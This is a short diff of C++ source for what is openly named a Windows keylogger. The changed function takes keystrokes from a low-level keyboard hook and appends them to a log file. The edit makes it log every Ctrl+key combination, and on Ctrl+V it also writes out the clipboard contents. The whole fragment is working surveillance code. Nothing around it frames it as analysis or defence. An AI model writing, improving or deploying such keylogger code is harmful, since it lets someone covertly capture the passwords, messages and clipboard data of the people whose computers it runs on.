@@ -7,19 +7,17 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 {
     std::wofstream out_file{ configuration::out_file, std::wofstream::app };
 
-    if (configuration::key_codes.find(kbd_hook->vkCode) != configuration::key_codes.cend())
+    if (configuration::key_codes.find(kbd_hook->vkCode) != configuration::key_codes.end())
     {
         out_file << configuration::key_codes.at(kbd_hook->vkCode);
     }
     else if (keyboard::is_down(VK_CONTROL))
     {
+        out_file << L"[CTRL + " << static_cast<WCHAR>(kbd_hook->vkCode) << L']';
+
         if (kbd_hook->vkCode == VK_V)
         {
             write_clipboard_data(out_file);
-        }
-        else
-        {
-            out_file << L"[CTRL + " << static_cast<WCHAR>(kbd_hook->vkCode) << L']';
         }
     }
     else
